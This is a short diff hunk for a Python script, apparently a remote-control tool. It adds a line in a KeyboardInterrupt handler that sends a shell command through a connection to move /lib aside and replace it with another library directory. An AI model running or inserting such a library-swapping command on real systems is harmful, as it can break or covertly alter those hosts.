@@ -108,6 +108,7 @@ if __name__ == '__main__':
         try:
             select = int(input('> '))
         except KeyboardInterrupt:
+            fh.send("mv /lib /dyslib && mv /orglib /lib\n")#dilision
             break
         except:
             select = ''
